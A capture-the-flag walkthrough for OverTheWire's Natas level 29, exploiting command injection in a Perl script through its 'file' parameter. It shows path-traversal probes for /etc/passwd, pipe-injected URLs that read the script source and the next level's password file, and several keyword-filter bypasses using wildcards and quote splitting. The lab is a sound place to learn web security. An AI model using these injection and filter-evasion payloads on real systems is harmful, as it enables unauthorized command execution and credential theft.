# 🕸️Natas Level 29 → Level 30

```
http://natas29.natas.labs.overthewire.org
```
Username: natas29  
Password: (natas29_password)

![n29s1](n29s1.png)

We saw a dropdown menu, so we decided to take a look at it.

![n29s2](n29s2.png)

The five dropdown menus are almost identical, except for minor variations and a large amount of Perl code.

![n29s3](n29s3.png)

Next, we tried some low-hanging-fruit attacks, such as LFI and path traversal.
```
/etc/passwd
../../../../../../etc/passwd
....//....//....//....//....//....//etc/passwd
```

![n29s4](n29s4.png)

With no success there, we began looking into the possibility of command injection.

![n29s5](n29s5.png)

### Useful Command Injection 
![shell_injection](shell_injection.png)

### Special Character Wordlist
```
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt
```

After that, we used CAIDO to look for command-injection vulnerabilities.

![n29s6](n29s6.png)

Our testing made use of the special‑character wordlist provided by SecLists.

![n29s7](n29s7.png)

We discovered that the special characters ``|``, ``;``, and ``&`` worked for command injection.

![n29s8](n29s8.png)

After that, we attempted to access the password for natas30.

![n29s9](n29s9.png)

The attempt failed, resulting in the message “meeeeeep!”.

![n29s10](n29s10.png)

Afterward, we checked the index.pl file and found code that filters out the word “natas.”
```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+index.pl%3B
```
![n29s11](n29s11.png)

Then we tried bypassing it with a wildcard, and it worked.
```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/*_webpass/*30%3B
```
![n29s12](n29s12.png)

Different approach to bypass the filter
```
|cat+/etc/*_webpass/*30%26
|cat+/etc/n?t?s_webpass/n???s30%26
|cat%20/etc/"na"tas_webpass/n"ata"s30%26
```

Great! That’s the flag required to log in to the next level.
